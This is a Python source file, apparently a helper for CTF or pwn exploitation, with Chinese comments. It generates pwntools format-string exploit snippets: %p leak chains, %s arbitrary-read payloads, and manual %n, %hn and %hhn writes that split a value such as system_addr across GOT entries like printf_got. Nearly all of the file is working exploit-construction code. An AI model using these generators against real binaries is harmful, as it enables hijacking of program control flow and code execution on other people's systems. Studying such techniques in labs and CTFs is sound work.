from __future__ import annotations

from dataclasses import dataclass


WRITE_SIZE_MAP = {
    "byte": "byte",
    "short": "short",
    "int": "int",
}


@dataclass(frozen=True)
class FmtWritePart:
    slot: int
    address_expr: str
    value_expr: str
    shift: int


def halfword_write_parts(target_addr: str, value_var: str, arch_bits: int = 32) -> list[FmtWritePart]:
    arch_bits = 32 if int(arch_bits) == 32 else 64
    count = 2 if arch_bits == 32 else 4
    return [
        FmtWritePart(
            slot=index,
            address_expr=f"{target_addr} + {index * 2}",
            value_expr=f"({value_var} >> {index * 16}) & 0xffff" if index else f"{value_var} & 0xffff",
            shift=index * 16,
        )
        for index in range(count)
    ]


def leak_chain(start: int = 1, count: int = 20) -> str:
    start = max(1, int(start))
    count = max(1, min(200, int(count)))
    return ".".join(f"%{index}$p" for index in range(start, start + count))


def raw_write_probe(offset: int, specifier: str = "hn") -> str:
    specifier = specifier.lstrip("%")
    if specifier not in {"n", "hn", "hhn"}:
        raise ValueError("specifier 只能是 n、hn 或 hhn")
    return f"%{{written}}c%{int(offset)}$" + specifier


def fmt_write_note() -> str:
    return (
        "# %n  : 写入目前已经输出的字符数，通常一次写 4/8 字节，padding 很大时不太稳\n"
        "# %hn : 写入低 2 字节，最常用于 GOT 分两段覆盖\n"
        "# %hhn: 写入低 1 字节，适合过滤严格或逐字节写\n"
    )


def fmtstr_payload_template(
    offset: int,
    address: str,
    value: str,
    write_size: str = "short",
    io_name: str = "io",
    numbwritten: int = 0,
) -> str:
    selected = WRITE_SIZE_MAP.get(write_size, "short")
    prefix = (
        "payload = fmtstr_payload(\n"
        f"    {int(offset)},\n"
        f"    {{{address}: {value}}},\n"
    )
    if int(numbwritten) > 0:
        prefix += f"    numbwritten={int(numbwritten)},\n"
    return (
        fmt_write_note()
        + prefix
        + f"    write_size='{selected}'\n"
        ")\n"
        f"{io_name}.sendline(payload)\n"
    )


def low_high_template(value_var: str = "system_addr", arch_bits: int = 32) -> str:
    value_var = (value_var or "system_addr").strip() or "system_addr"
    lines = [
        f"low  = {value_var} & 0xffff",
        f"high = ({value_var} >> 16) & 0xffff",
    ]
    if int(arch_bits) != 32:
        lines.extend(
            [
                f"part2 = ({value_var} >> 32) & 0xffff",
                f"part3 = ({value_var} >> 48) & 0xffff",
            ]
        )
    return "\n".join(lines) + "\n"


def payload_send_lines(
    io_name: str = "io",
    send_mode: str = "send",
    prompt: str = "b'> '",
    timeout: int = 10,
) -> str:
    io_name = (io_name or "io").strip() or "io"
    send_mode = (send_mode or "send").strip()
    prompt = (prompt or "b'> '").strip() or "b'> '"
    if send_mode == "none":
        send = ""
    elif send_mode == "sendline":
        send = f"{io_name}.sendline(payload)\n"
    elif send_mode == "sendafter":
        send = f"{io_name}.sendafter({prompt}, payload)\n"
    elif send_mode == "sendlineafter":
        send = f"{io_name}.sendlineafter({prompt}, payload)\n"
    else:
        send = f"{io_name}.send(payload)\n"
    return send


def s_read_payload_template(
    offset: int,
    target_addr: str,
    arch_bits: int = 32,
    io_name: str = "io",
    send_mode: str = "none",
    prompt: str = "b'> '",
) -> str:
    """Build only a `%s` leak fragment without fixing the input primitive."""
    bits = 32 if int(arch_bits) == 32 else 64
    pack = "p32" if bits == 32 else "p64"
    target_addr = (target_addr or "elf.got['puts']").strip()
    if bits == 32:
        payload = (
            f"target_addr = {target_addr}\n"
            f"payload  = {pack}(target_addr)\n"
            f"payload += f'%{int(offset)}$s'.encode()\n"
        )
    else:
        payload = (
            f"target_addr = {target_addr}\n"
            f"fmt = f'%{int(offset)}$s'.encode()\n"
            "payload = fmt.ljust(((len(fmt) + 7) // 8) * 8, b'A')\n"
            f"payload += {pack}(target_addr)  # 地址放在格式串末尾，避免 p64 中的 \\x00 提前截断\n"
        )
    return payload + payload_send_lines(io_name, send_mode, prompt)


def i386_hn_payload_template(
    offset: int = 6,
    target_addr: str = "printf_got",
    io_name: str = "io",
    send_mode: str = "none",
    prompt: str = "b'> '",
    timeout: int = 10,
    first_printed: int = 0,
    append_newline: bool = True,
) -> str:
    """Generate only the payload fragment for i386 low/high %hn writes."""
    target_addr = (target_addr or "printf_got").strip() or "printf_got"
    offset = int(offset)
    first_printed = int(first_printed)
    lines = [
        "# 只构造 payload，不强制发送；offset 需要指向 payload 末尾追加的地址参数。",
        f"write_targets = [(0, {target_addr}, low), (1, {target_addr} + 2, high)]",
        "fmt = b''",
        f"printed = {first_printed}",
        "for slot, addr, value in sorted(write_targets, key=lambda item: item[2]):",
        "    pad = (value - printed) % 0x10000",
        "    if pad:",
        "        fmt += f'%{pad}c'.encode()",
        f"    fmt += f'%{{{offset} + slot}}$hn'.encode()",
        "    printed = value",
        "payload = fmt.ljust(((len(fmt) + 3) // 4) * 4, b'A')",
        "payload += b''.join(p32(addr) for _slot, addr, _value in write_targets)",
    ]
    if append_newline:
        lines.append("payload += b'\\n'")
    return "\n".join(lines) + "\n" + payload_send_lines(io_name, send_mode, prompt, timeout)


def manual_hn_got_overwrite_template(
    offset: int,
    target_addr: str,
    target_value: str,
    arch_bits: int = 32,
    io_name: str = "io",
    timeout: int = 10,
    use_positional_width: bool = False,
    numbwritten: int = 0,
    send_mode: str = "none",
    prompt: str = "b'> '",
) -> str:
    arch_bits = 32 if int(arch_bits) == 32 else 64
    if arch_bits == 32:
        return (
            i386_hn_payload_template(
                offset=offset,
                target_addr=target_addr,
                io_name=io_name,
                send_mode=send_mode,
                prompt=prompt,
                timeout=timeout,
                first_printed=numbwritten,
            )
        )
    pack_func = "p32" if arch_bits == 32 else "p64"
    word = 4 if arch_bits == 32 else 8
    parts = halfword_write_parts("printf_got", "system_addr", arch_bits)
    part_names = ["low", "high", "part2", "part3"]
    part_lines = [f"write_base = {target_addr}", "parts = ["]
    for index, part in enumerate(parts):
        part_lines.append(f"    ({part.slot}, write_base + {part.slot * 2}, {part_names[index]}),  # +0x{part.slot * 2:x}, shift={part.shift}")
    part_lines.append("]")
    width_prefix = "%1$" if use_positional_width else "%"
    return (
        f"# {arch_bits} 位手写 %hn payload 片段：只构造 payload，不强制发送。\n"
        + "# 先设置 low/high/part2/part3；offset 指向 payload 末尾追加的第一个地址参数；按你的输入点自行 send/sendafter。\n"
        + "\n".join(part_lines) + "\n"
        + "fmt = b''\n"
        + f"printed = {int(numbwritten)}\n"
        + "for slot, addr, value in sorted(parts, key=lambda item: item[2]):\n"
        + "    pad = (value - printed) % 0x10000\n"
        + "    if pad:\n"
        + f"        fmt += f'{width_prefix}{{pad}}c'.encode()\n"
        + f"    fmt += f'%{{{int(offset)} + slot}}$hn'.encode()\n"
        + "    log.info('fmt[%d] addr=%#x value=%#x pad=%#x printed_before=%#x', slot, addr, value, pad, printed)\n"
        + "    printed = value\n"
        + "payload = fmt\n"
        + f"payload = payload.ljust(((len(payload) + {word} - 1) // {word}) * {word}, b'A')\n"
        + f"payload += b''.join({pack_func}(addr) for _slot, addr, _value in parts)\n"
        + payload_send_lines(io_name, send_mode, prompt, timeout)
    )


def manual_n_write_template(
    offset: int,
    target_addr: str,
    target_value: str,
    arch_bits: int = 32,
    io_name: str = "io",
    send_mode: str = "none",
    prompt: str = "b'> '",
) -> str:
    arch_bits = 32 if int(arch_bits) == 32 else 64
    pack_func = "p32" if arch_bits == 32 else "p64"
    word = 4 if arch_bits == 32 else 8
    modulo = "0x100000000" if arch_bits == 32 else "0x10000000000000000"
    specifier = "n" if arch_bits == 32 else "ln"
    return (
        "# 手写 %n：格式串在前、地址追加在末尾，offset 指向追加的 target_addr。\n"
        + f"target_addr = {target_addr}\n"
        + f"write_value = {target_value}\n"
        + f"pad = write_value % {modulo}\n"
        + f"fmt = f'%1${{pad}}c%{int(offset)}${specifier}'.encode() if pad else f'%{int(offset)}${specifier}'.encode()\n"
        + f"payload = fmt.ljust(((len(fmt) + {word} - 1) // {word}) * {word}, b'A')\n"
        + f"payload += {pack_func}(target_addr)\n"
        + payload_send_lines(io_name, send_mode, prompt)
    )
